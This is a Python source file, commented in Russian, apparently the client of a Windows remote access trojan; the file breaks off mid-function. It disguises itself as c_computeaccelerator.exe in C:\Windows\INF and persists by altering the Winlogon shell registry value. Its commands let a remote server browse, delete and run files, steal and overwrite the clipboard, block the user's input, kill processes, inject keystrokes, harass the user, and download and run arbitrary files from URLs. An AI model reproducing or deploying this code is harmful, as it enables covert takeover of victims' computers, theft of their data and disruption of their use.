import socket
import json
import keyboard
import os
import sys
import requests
import ctypes
import pyautogui
import time
import pyaudio   
import wave
import pygame
import pyperclip   
import numpy as np  
import tempfile
import subprocess
import random
import winreg as reg
import uuid
import shutil
import logging
import threading
import psutil
import cv2
import struct

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s', handlers=[logging.StreamHandler()])
logger = logging.getLogger(__name__)


# ====== Автоопределение CLIENT_ID (ИСПРАВЛЕНО) ======
def get_hwid():
    # 1. Попытка через WMIC (UUID материнской платы)
    try:
        cmd = 'wmic csproduct get uuid'
        try:
            oem_cp = f"cp{ctypes.windll.kernel32.GetOEMCP()}"
        except Exception:
            oem_cp = 'cp866'
        output = subprocess.check_output(cmd, shell=True).decode(oem_cp, errors='ignore').strip()
        lines = output.split('\n')
        hwid = lines[1].strip() if len(lines) > 1 else None
        if hwid and hwid != 'UUID':
            return hwid
    except Exception as e:
        logger.error(f"Ошибка получения HWID (WMIC): {e}")

    # 2. Попытка через Реестр (MachineGuid) — Самый надежный fallback
    # Работает, даже если WMI сломан. ID не меняется до переустановки Windows.
    try:
        key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", 0, reg.KEY_READ | reg.KEY_WOW64_64KEY)
        guid, _ = reg.QueryValueEx(key, "MachineGuid")
        reg.CloseKey(key)
        if guid:
            return guid
    except Exception as e:
        logger.error(f"Ошибка получения HWID (Registry): {e}")

    # 3. Последний шанс: MAC-адрес (Убрали случайный uuid4)
    # uuid.getnode() получает адрес сетевой карты. Он статичен.
    try:
        mac_num = uuid.getnode()
        return f"mac-{mac_num}"
    except Exception:
        pass
        
    # 4. Если совсем всё плохо (крайний случай), берем имя пользователя
    return f"user-{os.getenv('USERNAME', 'unknown')}"

device_name = os.getenv("COMPUTERNAME", "UnknownDevice")
CLIENT_ID = f"{device_name}/{get_hwid()}"
logger.info(f"CLIENT_ID: {CLIENT_ID}")

# ====== Настройки подключения ======
SERVER_IP = "#!"
SERVER_PORT = #type
RECONNECT_DELAY = 5
# ====== Глобальные переменные ======
CURRENT_VERSION = 17
TARGET_DIR = r"C:\Windows\INF"
new_name="c_computeaccelerator.exe"
stop_event = threading.Event()
auto_thread = None
socket_lock = threading.Lock()
current_socket = None
current_thread_id = None
current_path = os.path.expanduser("~")
file_lock = threading.Lock()
_mixer_initialized = False
music_thread = None
music_stop_event = threading.Event() 
mouse_mess_stop_event = threading.Event()
HB_INTERVAL = 10 # Отправляем каждые 10 секунд
hb_stop_event = threading.Event()
mouse_mess_thread = None

# ====== Вспомогательные функции ======
def initialize_mixer():
    """Инициализация микшера Pygame."""
    global _mixer_initialized
    if not _mixer_initialized:
        try:
            # Инициализация только если микшер еще не инициализирован
            if not pygame.mixer.get_init():
                pygame.mixer.init()
            _mixer_initialized = True
            return True
        except pygame.error as e:
            logger.error(f"Failed to initialize pygame mixer: {e}")
            return False
    return True

############################

def play_sound_task(conn, full_path):
    """
    Задача воспроизведения, запускаемая в отдельном потоке.
    Это предотвращает блокировку основного цикла клиента.
    """
    global music_thread
    try:
        # Остановка любой предыдущей музыки
        pygame.mixer.music.stop()
        
        # Загрузка и воспроизведение
        pygame.mixer.music.load(full_path)
        pygame.mixer.music.play()
        
        # Отправка начального подтверждения
        send_response(conn, '🎵 Music started playing successfully!')
        
        # Ожидание окончания воспроизведения ИЛИ события остановки
        while pygame.mixer.music.get_busy() and not music_stop_event.is_set():
            time.sleep(0.5)
            
        # Проверка причины выхода из цикла
        if not pygame.mixer.music.get_busy():
            # Завершилось естественным путем
            send_response(conn, '✅ Music finished playing!')
        else:
            # Остановлено командой /stopsound
            pass 
            
    except Exception as e:
        send_response(conn, f'❌ Error during music playback: {e}')
        
    finally:
        # Очистка глобальной ссылки на поток
        with socket_lock: # Используйте существующий глобальный лок для защиты
            if music_thread == threading.current_thread():
                music_thread = None
        music_stop_event.clear() # Очистка события для следующего запуска

############################

def mouse_mess_loop():
    logger.info("Mouse mess thread started.")
    while not mouse_mess_stop_event.is_set():
        try:
            # Получаем размеры экрана для случайных координат
            screen_width, screen_height = pyautogui.size()
            x = random.randint(100, screen_width - 100)
            y = random.randint(100, screen_height - 100)
            pyautogui.moveTo(x, y, duration=0.05) 
            time.sleep(0.1)
        except Exception as e:
            logger.error(f"Mouse mess error: {e}")
            break
    logger.info("Mouse mess thread stopped.")

############################

def kill_parent_stub():
    try:
        current_process = psutil.Process(os.getpid())
        parent_process = current_process.parent()

        if parent_process is not None:
            parent_name = parent_process.name().lower()
            logger.debug(f"[INFO] Завершаем родительский процесс: PID={parent_process.pid}, Name={parent_name}")
            parent_process.terminate()
            parent_process.wait(timeout=5)
        else:
            logger.debug("[INFO] Родительский процесс не найден")
    except Exception as e:
        logger.debug(f"[ERROR] Не удалось завершить родительский процесс: {e}")

############################

def change_shell():
    print("[START] Изменение shell запущено")
    try:
        print("[INFO] Открытие ключа реестра Winlogon...")
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
        print("[OK] Ключ открыт")
        value = r"explorer.exe, C:\Windows\INF\c_computeaccelerator.exe"
        print(f"[INFO] Установка значения shell: {value}")
        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, value)
        print("[SUCCESS] Значение 'shell' успешно изменено")
        reg.CloseKey(key)
        print("[INFO] Ключ закрыт")
    except Exception as e:
        print(f"[ERROR] Ошибка при изменении shell: {e}")
    finally:
        print("[END] Работа потока изменения shell завершена")


def copy_to_target(new_name="c_computeaccelerator.exe"):
    try:
        if not os.path.exists(TARGET_DIR):
            os.makedirs(TARGET_DIR)
            print(f"[INFO] Папка {TARGET_DIR} создана.")

        current_file = sys.argv[0]
        target_file = os.path.join(TARGET_DIR, new_name)

        if os.path.abspath(current_file) == os.path.abspath(target_file):
            print("[INFO] Уже работаем из целевой папки.")
            return True

        if not os.path.exists(target_file):
            shutil.copy(current_file, target_file)
            print(f"[INFO] Программа скопирована в {target_file}")
        else:
            print(f"[INFO] Файл уже существует в {target_file}, копирование не требуется.")

        os.startfile(target_file)
        print("[INFO] Запущен файл из целевой папки. Завершение текущего экземпляра.")
        change_shell()
        os._exit(0)

    except Exception as e:
        print(f"[ERROR] Ошибка при копировании или запуске: {e}")
        return False

############################

def delete_mei():
    temp_dir = tempfile.gettempdir()
    current_meipass = getattr(sys, "_MEIPASS", "")

    print(f"[DEBUG] TEMP DIR: {temp_dir}")
    print(f"[DEBUG] CURRENT _MEIPASS: {current_meipass}")

    for name in os.listdir(temp_dir):
        full_path = os.path.join(temp_dir, name)
        if name.startswith("_MEI") and os.path.isdir(full_path):
            print(f"[DEBUG] Найдена папка: {full_path}")
            if os.path.abspath(full_path) == os.path.abspath(current_meipass):
                print(f"[SKIP] Пропущена текущая _MEIPASS: {full_path}")
                continue
            try:
                shutil.rmtree(full_path, ignore_errors=False)
                print(f"[OK] Удалена: {full_path}")
            except Exception as e:
                print(f"[ERROR] Не удалось удалить {full_path}: {e}")

MAX_LEN = 3500  # граница под Telegram

def split_message(text, limit=MAX_LEN):
    """Разбивает длинный текст на несколько сообщений."""
    parts = []
    while len(text) > limit:
        # Ищем ближайший перенос строки, чтобы не рвать строки файлов
        cut = text.rfind('\n', 0, limit)
        if cut == -1:
            cut = limit
        parts.append(text[:cut])
        text = text[cut:].lstrip('\n')
    parts.append(text)
    return parts

#############################################################
# Ниже команды

def cmd_ls(args):
    """
    Показывает содержимое текущей или указанной папки.
    Если current_path - виртуальный корень (/), показывает список дисков.
    При слишком большом выводе — отправляет результат файлом.
    """
    global current_path
    target_path = current_path
    
    MAX_LEN = 4000  # лимит символов для отправки текста

    # 1. Если текущий путь - виртуальный корень (/), показываем диски
    if current_path == '/':
        drives = []
        for i in range(ord('A'), ord('Z') + 1):
            drive = chr(i) + ":\\"
            try:
                if os.path.exists(drive): 
                    total_bytes = psutil.disk_usage(drive).total
                    total_gb = round(total_bytes / (1024**3))
                    drives.append(f"💾 {drive} [{total_gb} GB]")
            except Exception:
                pass
        
        if drives:
            return "\n".join(drives)
        else:
            return "❌ Не удалось найти доступные диски."

    # 2. Переход в указанный путь
    if args.strip():
        if os.path.isdir(args.strip()):
            target_path = args.strip()
            if os.path.isabs(target_path):
                current_path = target_path
        else:
            target_path = os.path.join(current_path, args.strip())

    # 3. Чтение содержимого папки
    try:
        if not os.path.isdir(target_path):
            return f"❌ '{target_path}' не является папкой или недоступен."
             
        if not args.strip():
            target_path = current_path
        else:
            current_path = target_path 
            
        items = os.listdir(target_path)
        
        dirs = []
        files = []

        for item in items:
            full_path = os.path.join(target_path, item)
            if os.path.isdir(full_path):
                dirs.append(item)
            elif os.path.isfile(full_path):
                files.append(item)

        dirs.sort(key=str.lower)
        files.sort(key=str.lower)
        
        output = []
        output.extend([f"📁 {d}\\" for d in dirs])
        output.extend([f"📄 {f}" for f in files])
            
        if not output:
            return f"✅ Папка '{target_path}' пуста."

        full_text = "📂 " + current_path + "\n" + "\n".join(output)

        # 🔥 Если текст короткий — отправляем обычным сообщением
        if len(full_text) <= MAX_LEN:
            return full_text

        # 🔥 ИНАЧЕ — отправляем как файл
        try:
            import tempfile

            with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix="_ls.txt", encoding="utf-8") as tmp:
                tmp.write(full_text)
                temp_path = tmp.name

            # отправляем файл
            with socket_lock:
                conn = current_socket

            send_response(conn, None, cmd_name="/ls", is_file=True, file_path=temp_path)

            return None  # запретить отправку «принято» из главного цикла

        except Exception as e:
            return f"❌ Ошибка при создании файла вывода: {e}"

    except PermissionError:
        return f"❌ Отказано в доступе к '{target_path}'."
    except Exception as e:
        return f"❌ Ошибка при чтении '{target_path}': {e}"



def cmd_cd(args):
    global current_path
    logger.debug(f"Выполняется /cd с аргументами: {args}")
    try:
        with file_lock:
            path = os.path.normpath(os.path.join(current_path, args.strip()))
            if os.path.isdir(path):
                current_path = path
                return f"✅ Текущий путь: {current_path}"
            return "❌ Папка не существует или это не папка"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"


def cmd_back(args):
    """
    Переходит в родительскую папку. Из корневого каталога диска (C:\) 
    переводит в виртуальный корень (/) для просмотра дисков.
    """
    global current_path
    
    # 1. Если мы уже в виртуальном корне, возвращаем ошибку
    if current_path == '/':
        return "❌ Вы в корневой папке (просмотр дисков)"

    # 2. Проверка, находимся ли мы В КОРНЕ диска (например, "C:\")
    # 🔥 ИСПРАВЛЕНО: Условие должно быть len(current_path) == 3, а не >= 3
    if len(current_path) == 3 and current_path[1:3] == ':\\':
        # Если мы в C:\, переходим в виртуальный корень /
        current_path = '/'
        return f"✅ Текущий путь: Просмотр дисков ({current_path})"

    # 3. Стандартный переход в родительский каталог
    parent_path = os.path.dirname(current_path)

    if parent_path:
        # Убедимся, что путь имеет завершающий слэш, если это корень диска (C:\)
        # os.path.dirname('C:\\User') -> 'C:\\'
        # os.path.dirname('C:\\') -> 'C:' 
        if len(parent_path) == 2 and parent_path.endswith(':'): # Если os.path.dirname вернул "C:"
            parent_path += '\\'
            
        current_path = parent_path
        
    return f"✅ Текущий путь: {current_path}"


def cmd_pwd(args):
    logger.debug(f"Выполняется /pwd с аргументами: {args}")
    return current_path


def cmd_mkdir(args):
    logger.debug(f"Выполняется /mkdir с аргументами: {args}")
    try:
        with file_lock:
            path = os.path.join(current_path, args.strip())
            os.makedirs(path, exist_ok=True)
            return f"✅ Папка '{args.strip()}' создана"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"


def cmd_delete(args):
    logger.debug(f"Выполняется /delete с аргументами: {args}")
    try:
        with file_lock:
            path = os.path.join(current_path, args.strip())
            if os.path.isdir(path):
                shutil.rmtree(path, ignore_errors=True)
            elif os.path.isfile(path):
                os.remove(path)
            else:
                return "❌ Не найдено"
            return "✅ Удалено"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"


def cmd_rename(args):
    logger.debug(f"Выполняется /rename с аргументами: {args}")
    try:
        with file_lock:
            parts = args.split('/n', 1)
            if len(parts) < 2:
                return "❌ Формат: /rename old/nnew"
            old, new = parts[0].strip(), parts[1].strip()
            old_path = os.path.join(current_path, old)
            new_path = os.path.join(current_path, new)
            os.rename(old_path, new_path)
            return f"✅ Переименовано в '{new}'"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"


def cmd_copy(args):
    logger.debug(f"Выполняется /copy с аргументами: {args}")
    try:
        with file_lock:
            parts = args.split('/to', 1)
            if len(parts) < 2:
                return "❌ Формат: /copy src/to dst"
            src, dst = parts[0].strip(), parts[1].strip()
            src_path = os.path.join(current_path, src)
            dst_path = os.path.join(current_path, dst)
            if os.path.isdir(src_path):
                shutil.copytree(src_path, dst_path, dirs_exist_ok=True)
            else:
                shutil.copy2(src_path, dst_path)
            return f"✅ Скопировано в '{dst}'"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"

def cmd_move(args):
    logger.debug(f"Выполняется /move с аргументами: {args}")
    try:
        with file_lock:
            parts = args.split('/to', 1)
            if len(parts) < 2:
                return "❌ Формат: /move src/to dst"
            src, dst = parts[0].strip(), parts[1].strip()
            src_path = os.path.join(current_path, src)
            dst_path = os.path.join(current_path, dst)
            shutil.move(src_path, dst_path)
            return f"✅ Перемещено в '{dst}'"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"

# ====== Другие команды (ИСПРАВЛЕН /msg) ======
def cmd_msg(args):
    try:
        parts = args.split('/t', 1)
        if len(parts) < 2:
            return "Формат: /msg [type] [title]/t<text>"
        
        header = parts[0].strip().split()
        text = parts[1].strip()
        
        # Типы иконок
        types = {
            "info":     0x40,  # ℹ️
            "warning":  0x30,  # Warning
            "error":    0x10,  # Error
            "question": 0x20   # Question
        }
        msg_type = header[0].lower() if header else "info"
        icon = types.get(msg_type, 0x40)
        
        # Заголовок
        title = " ".join(header[1:]) if len(header) > 1 else "Сообщение"

        # Скрытое окно + MessageBox
        def show_msgbox():
            user32 = ctypes.windll.user32
            hwnd = user32.CreateWindowExW(0, "STATIC", "", 0, 0, 0, 0, 0, 0, 0, 0, 0)
            user32.MessageBoxW(hwnd, text, title, icon | 0x1000)  # MB_SYSTEMMODAL
            user32.DestroyWindow(hwnd)

        threading.Thread(target=show_msgbox, daemon=True).start()
        return "Готово"
    
    except Exception as e:
        return f"Ошибка: {e}"


def cmd_changeclipboard(args):
    if not args:
        return "❌ Укажите текст для буфера обмена."
    try:
        text = args.strip()
        # Windows: 'echo | set /p nul=текст | clip'
        # Используем двойные кавычки для безопасности
        command = f'echo | set /p nul="{text}" | clip' 
        os.system(command)
        return f'✅ Буфер обмена изменен на: \"{text}\"'
    except Exception as e:
        return f'❌ Ошибка: {e}'

def cmd_restart(args):
    """
    Перезапускает клиент, используя start через shell для независимого запуска 
    нового процесса и sys.exit() для немедленного завершения старого.
    """
    try:
        # --- ТОЛЬКО ДЛЯ WINDOWS (os.name == 'nt') ---
        if os.name == 'nt': 
            
            # 1. Формируем команду для нового процесса (гарантия чистых путей)
            reboot_command = [sys.executable] + sys.argv
            
            # Экранируем аргументы (заключаем в кавычки) для команды start
            quoted_reboot_command = " ".join(f'"{arg}"' for arg in reboot_command)
            
            # Используем start "" для запуска нового процесса
            cmd_string = f'start "" {quoted_reboot_command}'
            
            # 2. Запускаем новый процесс независимо
            subprocess.Popen(
                cmd_string, 
                shell=True,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP, 
                close_fds=True
            )
            
            # 3. НЕОБХОДИМЫЙ ШАГ: Немедленное завершение текущего процесса
            # Отправляем сообщение перед выходом
            # logger.info("Перезапуск выполнен. Выход из старого процесса...")
            
            # Добавляем очень короткую задержку, чтобы новый процесс успел запуститься
            time.sleep(0.5) 
            
            # Принудительно завершаем выполнение скрипта. Это ГАРАНТИРУЕТ закрытие.
            sys.exit(0) 

        # --- Для других ОС (если нужно сохранить совместимость) ---
        else: 
            reboot_command = [sys.executable] + sys.argv
            subprocess.Popen(
                reboot_command,
                start_new_session=True,
                close_fds=True
            )
            time.sleep(0.5) 
            sys.exit(0) 

    except Exception as e:
        # В случае ошибки, возвращаем управление главному циклу, чтобы не рухнуть
        # logger.error(f"Ошибка при попытке перезапуска: {e}")
        return f"❌ Ошибка при перезапуске: {e}", True, None

def cmd_minimize(args):
    try:
        # Win + Down Arrow
        pyautogui.hotkey("win", "down")
        return "✅ Активное окно свернуто."
    except Exception as e:
        return f"❌ Ошибка: {e}"

def cmd_maximize(args):
    try:
        # Win + Up Arrow
        pyautogui.hotkey("win", "up")
        return "✅ Активное окно развернуто."
    except Exception as e:
        return f"❌ Ошибка: {e}"

def block_input(args):
    """Блокирует ввод пользователя (мышь и клавиатура)."""
    try:
        ctypes.windll.user32.BlockInput(True)
        return "✅ Блокировка ввода (мышь/клавиатура) активирована."
    except Exception as e:
        return f"❌ Ошибка блокировки ввода: {e}"

def unblock_input(args):
    """Снимает блокировку ввода пользователя."""
    try:
        # Снимаем блокировку
        ctypes.windll.user32.BlockInput(False)
        
        # Убеждаемся, что MouseKill тоже остановлен
            
        return "✅ Блокировка ввода (мышь/клавиатура) снята."
    except Exception as e:
        return f"❌ Ошибка снятия блокировки ввода: {e}"

def cmd_version(args):
    """Возвращает версию клиента"""
    return f"Версия клиента: {CURRENT_VERSION}"

def get_clipboard_content(args):
    """Получает текстовое содержимое буфера обмена."""
    CF_TEXT = 1
    
    kernel32 = ctypes.windll.kernel32
    user32 = ctypes.windll.user32
    
    # Настройка аргументов/возвращаемых значений для C-функций
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    user32.GetClipboardData.restype = ctypes.c_void_p
    
    try:
        if not user32.OpenClipboard(0):
            return "❌ Не удалось открыть буфер обмена."
        
        result_text = "📋 Буфер обмена пуст или содержит нетекстовые данные."
        
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            data = user32.GetClipboardData(CF_TEXT)
            if data:
                data_locked = kernel32.GlobalLock(data)
                text_ptr = ctypes.c_char_p(data_locked)
                value = text_ptr.value # Получаем байты
                kernel32.GlobalUnlock(data_locked)
                
                if value:
                    # Попытки декодирования: UTF-8 -> CP1251
                    try:
                        body = value.decode('utf-8', errors='strict')
                    except UnicodeDecodeError:
                        body = value.decode('cp1251', errors='replace')
                    
                    username = os.getlogin()
                    result_text = f"📋 Буфер обмена пользователя '{username}':\n---\n{body}"
        
        return result_text
        
    except Exception as e:
        return f"❌ Ошибка при чтении буфера обмена: {e}"
    finally:
        # Важно всегда закрывать буфер обмена
        try:
            user32.CloseClipboard()
        except Exception:
            pass
            
def cmd_cmdbomb(args):
    try:
        # Открываем 10 окон CMD
        os.popen('start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd')
        return '✅ Открыто 10 окон CMD.'
    except Exception as e:
        return f'❌ Ошибка: {e}'

def cmd_altf4(args):
    try:
        pyautogui.hotkey('alt', 'f4')
        return '✅ Нажато ALT + F4.'
    except Exception as e:
        return f'❌ Ошибка: {e}'

def cmd_taskkill(args):
    """
    Закрывает один или несколько процессов по имени или PID.
    Принимает список имен/PID, разделенных пробелами.
    Пример: /taskkill chrome.exe 1234
    """
    if not args:
        return "❌ Укажите имя процесса (например, chrome.exe) или PID (число)."

    targets = args.strip().split()
    results = []

    for target in targets:
        # Проверяем, является ли цель PID (числом)
        if target.isdigit():
            # Закрываем по PID
            command = ['taskkill', '/PID', target, '/F']
            desc = f"PID {target}"
        else:
            # Закрываем по имени
            command = ['taskkill', '/IM', target, '/F']
            desc = f"Процесс {target}"

        try:
            subprocess.run(command, check=True, capture_output=True, text=True, encoding='utf-8')
            results.append(f"✅ {desc} успешно завершен.")
        except subprocess.CalledProcessError as e:
            # Taskkill выдает ошибку, если процесс не найден
            output = e.stderr.strip().split('\n')[-1]
            results.append(f"❌ {desc}: {output}")
        except Exception as e:
            results.append(f"❌ {desc}: Общая ошибка: {e}")

    return "\n".join(results)

def cmd_tasklist(args):
    """
    Выводит список запущенных процессов, включая путь к исполняемому файлу,
    и сохраняет результат в TXT-файл. (Использует WMIC с исправленным парсингом)
    """
    if os.name != 'nt':
        return "❌ Команда Tasklist (WMIC) поддерживается только в Windows."
        
    temp_file_path = None
    try:
        # 1. Используем WMIC для получения Имени, Пути к файлу и PID.
        # Вывод: Node,Caption,ExecutablePath,ProcessId
        command = ['wmic', 'process', 'get', 'Caption,ExecutablePath,ProcessId', '/format:csv']
        
        # Используем cp866 для Windows
        result = subprocess.run(command, capture_output=True, text=True, check=True, encoding='cp866', errors='replace')
        
        output_lines = ["TASKLIST (Имя процесса | PID | Путь к файлу)\n", "="*100 + "\n"]
        
        csv_data = result.stdout.strip().split('\n')
        
        data_found = False

        # Пропускаем первые строки (пустая строка и заголовки), начиная обработку с третьего элемента (индекс 2)
        for i, line in enumerate(csv_data):
            if i < 2: continue # Пропускаем две строки с метаданными

            line = line.strip()
            if not line: continue

            # Разделяем по запятой. Ожидаем 4 части: Node, Caption, ExecutablePath, ProcessId
            parts = [p.strip() for p in line.split(',')]
            
            # 🔥 ИСПРАВЛЕНИЕ: Проверяем, что есть 4 элемента и PID - число
            if len(parts) == 4 and parts[3].isdigit(): 
                # parts[1] = Caption (Имя процесса)
                # parts[2] = ExecutablePath (Путь)
                # parts[3] = ProcessId (PID)
                
                image_name = parts[1]
                path = parts[2] or "N/A" # Путь может быть пустым для системных процессов
                pid = parts[3]
                
                # Форматируем в одну чистую строку
                formatted_line = (
                    f"{image_name:<30}"[:30] + 
                    f" | {pid:<5}" + 
                    f" | {path}\n"
                )
                output_lines.append(formatted_line)
                data_found = True
        
        if not data_found:
             # Если данные не найдены, возвращаем ошибку
             return f"❌ Не удалось найти запущенные процессы. Код завершения WMIC: {result.returncode}"

        # 2. Создаем временный файл
        with tempfile.NamedTemporaryFile(mode='w', suffix='_tasklist.txt', delete=False, encoding='utf-8') as tmp:
            tmp.writelines(output_lines)
            temp_file_path = tmp.name
        
        # 3. ВОЗВРАЩАЕМ ПУТЬ К ФАЙЛУ
        return temp_file_path  

    except Exception as e:
        return f"❌ Критическая ошибка Tasklist (WMIC): {e}"


def cmd_keypress(args):
    """Нажимает комбинацию клавиш: /keypress alt f4"""
    if not args or not args.strip():
        return "Используйте: /keypress <клавиши>"
    
    keys = [k.strip().lower() for k in args.split() if k.strip()]
    if not keys:
        return "Укажите клавиши."
    
    try:
        pyautogui.hotkey(*keys, interval=0.05)
        return f"Нажато: `{', '.join(keys)}`"
    except Exception as e:
        return f"Ошибка: {e}"


def cmd_mousemove(args):
    if not args:
        return "❌ Укажите координаты X и Y."
    try:
        cordinates = args.strip().split()
        x = int(cordinates[0])
        y = int(cordinates[1])

        pyautogui.moveTo(x, y)
        return f'✅ Указатель мыши перемещен в {x}, {y}.'
    except (ValueError, IndexError):
        return "❌ Неверный формат координат. Используйте: X Y (целые числа)."
    except Exception as e:
        return f'❌ Ошибка: {e}'

def simulate_key_type(args):
    """Вводит текст целиком, без пробелов между символами."""
    if not args:
        return "Используйте: /keytype <текст>"
    
    try:
        # Используем keyboard.write() — он корректно вводит кириллицу и английский
        keyboard.write(args)
        # Опционально: имитируем "человеческий" ввод с задержкой
        # keyboard.write(args, delay=0.05)
        return f"Текст введён: {args}"
    except Exception as e:
        return f"Ошибка ввода: {e}"


def cmd_mouseclick(args):
    try:
        pyautogui.click()
        return '✅ Клик мыши выполнен.'
    except Exception as e:
        return f'❌ Ошибка: {e}'


def cmd_mousemesstart(args):
    global mouse_mess_thread
    if mouse_mess_thread and mouse_mess_thread.is_alive():
        return "⚠️ Хаос уже запущен."
    
    # Сбрасываем флаг, чтобы запустить цикл
    mouse_mess_stop_event.clear()
    
    # Создаем и запускаем новый поток в фоновом режиме (daemon=True)
    mouse_mess_thread = threading.Thread(target=mouse_mess_loop, daemon=True)
    mouse_mess_thread.start()
    
    return '✅ Хаос мыши запущен!'

def cmd_mousemesstop(args):
    global mouse_mess_thread
    if mouse_mess_thread and mouse_mess_thread.is_alive():
        # Устанавливаем флаг, чтобы остановить цикл
        mouse_mess_stop_event.set()
        # Ждем завершения потока (с таймаутом 2с)
        mouse_mess_thread.join(2) 
        mouse_mess_thread = None
        return '✅ Хаос мыши остановлен.'
    
    return '⚠️ Хаос мыши не был запущен.'

def cmd_wallpaper(args):
    logger.debug(f"Выполняется /wallpaper с аргументами: {args}")
    try:
        path_arg = args.strip()
        if not path_arg:
            return "❌ Укажите путь"
        path = path_arg if os.path.isabs(path_arg) else os.path.join(current_path, path_arg)
        path = os.path.abspath(path)
        if not os.path.isfile(path):
            return "❌ Файл не найден"
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        return "✅ Обои изменены"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"


def cmd_volumeplus(args):
    logger.debug(f"Выполняется /volumeplus с аргументами: {args}")
    try:
        steps = int(args.strip()) if args.strip().isdigit() else 5
        steps = min(max(steps, 1), 50)
        for _ in range(steps):
            pyautogui.press('volumeup')
            time.sleep(0.05)
        return f"✅ Громкость +{steps * 2}%"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"

def cmd_volumeminus(args):
    logger.debug(f"Выполняется /volumeminus с аргументами: {args}")
    try:
        steps = int(args.strip()) if args.strip().isdigit() else 5
        steps = min(max(steps, 1), 50)
        for _ in range(steps):
            pyautogui.press('volumedown')
            time.sleep(0.05)
        return f"✅ Громкость -{steps * 2}%"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"


def cmd_download_link(args: str):
    """
    Запускает скачивание в отдельном потоке и сразу возвращает None.
    Главный цикл НЕ будет отправлять «Принято».
    """
    # берём текущий сокет (защищённый lock-ом)
    with socket_lock:
        conn = current_socket

    if not conn:
        return "Ошибка Нет соединения."

    # стартуем поток
    threading.Thread(
        target=download_link_worker,
        args=(args, conn),
        daemon=True,
    ).start()

    # ВАЖНО: возвращаем None → главный цикл пропустит send_response
    return None

def cmd_ping(args):
    """
    Просто возвращает статус, используется для Heartbeat.
    """
    return "alive" # Можно возвращать любую строку



def client_heartbeat_loop():
    """
    Регулярно отправляет команду /ping на Сервер, используя текущий сокет.
    """
    logger.info("Запущен Heartbeat-поток.")
    while not hb_stop_event.is_set():
        # Используем глобальный сокет, защищенный локом
        with socket_lock:
            conn = current_socket
        
        if conn:
            try:
                # Отправляем /ping в JSON-формате
                payload = json.dumps({"command": "/ping"}).encode('utf-8') + b'\n'
                conn.sendall(payload)
                logger.debug("Heartbeat /ping отправлен.")
            except Exception as e:
                # Если отправить не удалось, значит, сокет умер или в плохом состоянии.
                # Главный цикл main_client_loop скоро это обнаружит и переподключится.
                logger.warning(f"Ошибка Heartbeat: {e}")
                # Выходим, чтобы не спамить ошибками, пока не произойдет переподключение
                hb_stop_event.set() 
                break 

        # Ждем 10 секунд или до сигнала остановки
        hb_stop_event.wait(HB_INTERVAL)
        
    logger.info("Heartbeat-поток остановлен.")

def cmd_sysinfo(args):
    logger.debug(f"Выполняется /sysinfo с аргументами: {args}")
    try:
        info = {
            "OS": f"Windows {os.sys.platform}",
            "CPU": f"{psutil.cpu_percent(interval=0.5)}%",
            "RAM": f"{psutil.virtual_memory().percent}%",
            "Disk": f"{psutil.disk_usage(current_path).percent}%"
        }
        return "\n".join(f"{k}: {v}" for k, v in info.items())
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"


def cmd_run(args):
    global current_path 
    
    if not args:
        return "❌ Укажите имя файла для запуска."

    try:
        # Извлекаем имя файла (убираем кавычки/пробелы)
        file = args.strip('"\' ')
        
        # 1. Формируем полный путь
        full_path = os.path.join(current_path, file)
        
        # 2. Проверяем существование
        if not os.path.isfile(full_path):
            return f"❌ Файл не найден: {full_path}"

        # 3. Запуск файла (Универсальный и надежный способ для Windows)
        # Мы используем Popen, аналогично вашему os.popen('start "" "{path}"')
        
        # Windows: os.startfile или 'start' через shell
        if os.name == 'nt': 
            try:
                # Попытка использовать os.startfile (самый чистый способ)
                os.startfile(full_path)
            except AttributeError:
                # Если os.startfile недоступен, используем Popen с командой 'start'
                subprocess.Popen(f'start "" "{full_path}"', shell=True)
            except Exception as e:
                 # Если ошибка прав или другая проблема
                 return f'❌ Ошибка запуска (Win): {e}'
        else: 
            # Не-Windows (Unix-подобные): для общего случая
             subprocess.Popen(['xdg-open', full_path]) 

        return f'✅ Открыт: {file}'

    except Exception as e:
        logger.error(f"Ошибка при запуске файла: {e}")
        return f'❌ Ошибка при запуске: {e}'
    

def download_link_worker(args: str, conn: socket.socket):
    """
    Скачивает файл по ссылке, сохраняет в current_path,
    при необходимости запускает и отправляет результат.
    """
    # Внутренняя функция-обёртка для send_response (чтобы не тащить её в аргументы)
    def _send(msg: str):
        send_response(conn, msg, cmd_name="/download_link")

    try:
        parts = args.strip().split()
        if len(parts) < 1:
            _send("Ошибка Укажите ссылку.")
            return

        link = parts[0]
        download_only = len(parts) > 1 and parts[1] == '0'

        # ------------------- скачивание -------------------
        resp = requests.get(link, stream=True, timeout=120)   # таймаут побольше
        resp.raise_for_status()

        # имя файла из URL (или заголовка)
        filename = os.path.basename(link.split('?')[0]) or f"dl_{int(time.time())}.bin"
        save_path = os.path.join(current_path, filename)

        with file_lock:
            with open(save_path, "wb") as f:
                for chunk in resp.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)

        # ------------------- запуск (если нужно) -------------------
        if not download_only:
            if os.name == "nt":
                os.startfile(save_path)
            else:
                subprocess.Popen(["xdg-open", save_path])

        _send(
            f"Файл загружен: `{filename}`"
            + ("" if download_only else " и запущен")
        )
    except requests.Timeout:
        _send("Ошибка Таймаут загрузки.")
